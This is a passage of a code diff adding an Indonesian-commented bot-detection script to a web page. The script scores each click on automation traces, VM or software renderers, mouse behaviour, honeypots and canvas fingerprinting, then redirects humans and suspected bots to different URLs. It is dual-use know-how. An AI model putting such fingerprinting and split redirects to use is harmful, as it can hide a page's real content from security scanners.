+        if ((selProps[i] in document) || (selProps[i] in window)) { add(120, 'automation_prop'); break; }
+      }
+
+      try {
+        const wKeys = Object.keys(window);
+        if (wKeys.some(function (k) { return k.indexOf('cdc_') === 0 || k.indexOf('$cdc_') === 0; })) {
+          add(120, 'cdc_window');
+        }
+        const dKeys = Object.keys(document);
+        if (dKeys.some(function (k) { return k.indexOf('cdc_') === 0; })) {
+          add(120, 'cdc_document');
+        }
+      } catch (e) { /* ignore */ }
+
+      if (!navigator.languages || navigator.languages.length === 0) {
+        add(25, 'no_languages');
+      }
+
+      if (!isMobile && navigator.plugins && navigator.plugins.length === 0 && /chrome|firefox/i.test(ua)) {
+        add(10, 'no_plugins');
+      }
+      if (!isMobile && navigator.mimeTypes && navigator.mimeTypes.length === 0 && /chrome|firefox/i.test(ua)) {
+        add(8, 'no_mimetypes');
+      }
+
+      if (navigator.hardwareConcurrency === 0 || navigator.hardwareConcurrency == null) {
+        add(12, 'no_cores');
+      } else if (navigator.hardwareConcurrency > 32) {
+        add(6, 'weird_cores');
+      }
+
+      if (typeof navigator.deviceMemory !== 'undefined' &&
+          navigator.deviceMemory !== null &&
+          navigator.deviceMemory < 2) {
+        add(5, 'low_memory');
+      }
+
+      if (!isMobile && (window.outerWidth === 0 || window.outerHeight === 0)) { add(18, 'zero_outer'); }
+      if (window.screen && window.screen.width === 0)          { add(20, 'zero_screen'); }
+      if (window.screen && window.screen.colorDepth && window.screen.colorDepth < 24) {
+        add(8, 'low_color_depth');
+      }
+      if (window.innerWidth > (window.screen.width + 5) ||
+          window.innerHeight > (window.screen.height + 5)) {
+        add(12, 'window_bigger_than_screen');
+      }
+
+      const isChrome = /Chrome\//.test(ua) && !/Edg\/|OPR\/|Brave|Vivaldi/i.test(ua);
+      if (isChrome && !window.chrome) { add(22, 'no_window_chrome'); }
+      if (isChrome && window.chrome && !window.chrome.runtime && !window.chrome.app && !window.chrome.csi) {
+        add(8, 'empty_chrome_obj');
+      }
+
+      if (S.notifPerm === 'denied') { add(8, 'notif_denied'); }
+
+      const gl = webglInfo();
+      if (!gl.ok) {
+        add(20, 'no_webgl');
+      } else if (/swiftshader|llvmpipe|software|mesa offscreen|virtualbox|vmware|parallels/i.test(gl.renderer)) {
+        add(40, 'software_renderer');
+      }
+
+      if (!document.hasFocus()) { add(20, 'no_focus'); }
+      if (document.visibilityState !== 'visible') { add(25, 'hidden_tab'); }
+
+      if (S.visitCount > CFG.maxVisitsPerMin) { add(20, 'too_many_visits'); }
+
+      return { penalty: penalty, reasons: reasons };
+    }
+
+    /* ══════════════════════════════════════════════════════════
+     *  DETEKSI AKTIVASI VIA KEYBOARD
+     * ══════════════════════════════════════════════════════════ */
+    function isKeyboardActivation() {
+      const t = performance.now();
+      return S.keys.some(function (k) {
+        return (k.key === 'Enter' || k.key === ' ' || k.key === 'Spacebar') && (t - k.t) < 1500;
+      });
+    }
+
+    /* ══════════════════════════════════════════════════════════
+     *  EVALUASI UTAMA
+     * ══════════════════════════════════════════════════════════ */
+    function evaluateClick(ev) {
+      const timeOnPage = Date.now() - T_START;
+      const reasons    = [];
+      let   score      = 0;
+
+      /* ───────── HARD FAIL ───────── */
+
+      const honeypotFilled = honeypots.some(function (h) {
+        return h.value !== '' || h.dataset.filled === '1';
+      });
+      if (honeypotFilled) { return { bot: true, reason: 'honeypot', score: -1 }; }
+
+      if (S.decoyHit) { return { bot: true, reason: 'decoy_clicked', score: -1 }; }
+
+      if (!ev || ev.isTrusted !== true) {
+        return { bot: true, reason: 'untrusted_event', score: -1 };
+      }
+
+      if (navigator.webdriver === true) {
+        return { bot: true, reason: 'webdriver', score: -1 };
+      }
+
+      if (('_phantom' in window) || ('callPhantom' in window) ||
+          ('__nightmare' in window) ||
+          (('Buffer' in window) && ('process' in window))) {
+        return { bot: true, reason: 'automation_globals', score: -1 };
+      }
+
+      if (timeOnPage < CFG.minTimeOnPage) {
+        return { bot: true, reason: 'too_fast', score: -1 };
+      }
+
+      if (S.moves.length === 0 && S.touchCount === 0 && S.keys.length === 0 && S.scrollCount === 0) {
+        return { bot: true, reason: 'no_interaction', score: -1 };
+      }
+
+      const rect   = button.getBoundingClientRect();
+      const kbMode = isKeyboardActivation();
+      const isTouch = S.touchCount > 0;
+
+      if (!kbMode && !isTouch) {
+        const inside =
+          ev.clientX >= rect.left - 3 && ev.clientX <= rect.right  + 3 &&
+          ev.clientY >= rect.top  - 3 && ev.clientY <= rect.bottom + 3;
+
+        if (!inside) { return { bot: true, reason: 'click_outside_button', score: -1 }; }
+
+        if (!S.pointerDown || !S.pointerUp) {
+          return { bot: true, reason: 'no_pointer_pair', score: -1 };
+        }
+
+        if (ev.detail === 0) {
+          return { bot: true, reason: 'programmatic_click', score: -1 };
+        }
+
+        if (ev.clientX === 0 && ev.clientY === 0) {
+          return { bot: true, reason: 'zero_coordinates', score: -1 };
+        }
+      }
+
+      /* ───────── SCORING ───────── */
+      score = 50;
+
+      const ms = mouseStats();
+
+      if (S.moves.length >= CFG.minMouseMoves)      { score += 10; }
+      else if (S.moves.length > 0)                  { score -= 10; }
+      else if (isTouch || kbMode)                   { score += 6;  }
+      else                                          { score -= 25; }
+
+      if (S.pathLength >= CFG.minPathLength)        { score += 14; }
+      else if (S.pathLength > 40)                   { score += 2;  }
+      else if (isTouch || kbMode)                   { score += 6;  }
+      else                                          { score -= 18; }
+
+      if (ms.ok) {
+        if (ms.stdDev >= 0.25)      { score += 10; } else { score -= 12; }
+        if (ms.duration >= 250)     { score += 6;  } else { score -= 8;  }
+        if (ms.straightness < 0.97) { score += 5;  } else { score -= 6;  }
+      }
+
+      const hoverNow = S.hoverStart ? (performance.now() - S.hoverStart) : 0;
+      const hover    = Math.max(S.hoverTime, hoverNow);
+
+      if (kbMode || isTouch) {
+        score += 10;
+      } else if (hover >= CFG.minHoverTime) {
+        score += 12;
+      } else if (hover > 0) {
+        score += 2;
+      } else {
+        score -= 10;
+        reasons.push('no_hover');
+      }
+
+      if (S.pointerDown && S.pointerUp) {
+        const delta = S.pointerUp.t - S.pointerDown.t;
+        const dist  = Math.hypot(S.pointerUp.x - S.pointerDown.x, S.pointerUp.y - S.pointerDown.y);
+
+        if (delta >= 25 && delta <= 900)      { score += 10; }
+        else if (delta < 12)                  { score -= 15; reasons.push('instant_click'); }
+        else if (delta > 3000)                { score -= 8;  reasons.push('slow_click'); }
+
+        if (dist > 25)                        { score -= 10; reasons.push('drag_click'); }
+
+        if (S.pointerDown.trusted !== true || S.pointerUp.trusted !== true) {
+          score -= 40;
+          reasons.push('untrusted_pointer');
+        }
+
+        if (S.pointerDown.pointerType === '' || S.pointerDown.pointerType == null) {
+          score -= 8;
+          reasons.push('no_pointer_type');
+        }
+      }
+
+      if (timeOnPage > 2500) { score += 6; }
+      if (timeOnPage > 6000) { score += 4; }
+
+      if (canvasFingerprint() !== 'error') { score += 5; }
+
+      if (S.powDone === true)       { score += 8; }
+      else if (S.powDone === 'na')  { score += 0; }
+      else                          { score -= 8; reasons.push('no_pow'); }
+
+      const nowP = performance.now();
+      S.clickStamps.push(nowP);
+      S.clickStamps = S.clickStamps.filter(function (t) { return nowP - t < 2000; });
+      if (S.clickStamps.length > 3) {
+        score -= 25;
+        reasons.push('rapid_clicks');
+      }
+
+      const env = envPenalty();
+      score -= env.penalty;
+      if (env.reasons.length) { reasons.push.apply(reasons, env.reasons); }
+
+      const isBot = (score < CFG.scoreThreshold) || (env.penalty >= 120);
+
+      return {
+        bot: isBot,
+        score: Math.round(score),
+        penalty: env.penalty,
+        reasons: reasons
+      };
+    }
+
+    /* ══════════════════════════════════════════════════════════
+     *  HANDLER KLIK TOMBOL
+     * ══════════════════════════════════════════════════════════ */
+    button.addEventListener('click', function (ev) {
+      if (S.finished) { return; }
+      S.finished = true;
+
+      const result = evaluateClick(ev);
+
+      if (result.bot) {
+        if (window.console && console.warn) {
+          console.warn('⛔ Bot terdeteksi →', result.reason || result.reasons, '| skor:', result.score);
+        }
+
+        statusMessage.textContent = '⛔ Akses ditolak. Aktivitas mencurigakan terdeteksi.';
+        statusMessage.classList.add('show', 'error');
+
+        setTimeout(function () {
+          window.location.replace(BOT_REDIRECT);
+        }, CFG.botDelay);
+
+        return;
+      }
+
+      if (window.console && console.log) {
+        console.log('✅ Manusia terverifikasi | skor:', result.score);
+      }
+
+      button.classList.add('loading');
+      statusMessage.classList.remove('error');
+      statusMessage.classList.add('show');
+      statusMessage.textContent = '✅ Verifikasi berhasil. Mengarahkan Anda...';
+
+      setTimeout(function () {
+        window.location.href = TUJUAN_URL;
+      }, CFG.redirectDelay);
+    });
+
+    /* ══════════════════════════════════════════════════════════
+     *  INISIALISASI
+     * ══════════════════════════════════════════════════════════ */
+    S.visitCount = registerVisit();
+
+    if (navigator.permissions && navigator.permissions.query) {
+      try {
+        navigator.permissions.query({ name: 'notifications' })
+          .then(function (p) { S.notifPerm = p.state; })
+          .catch(function () { /* ignore */ });
+      } catch (e) { /* ignore */ }
+    }
+
+    runProofOfWork();
+
+    window.addEventListener('load', function () {
+      if (window.console && console.log) {
+        console.log('🔒 Security Page Loaded');
+      }
+    });
+
+  })();
+  </script>
 </body>
 </html>
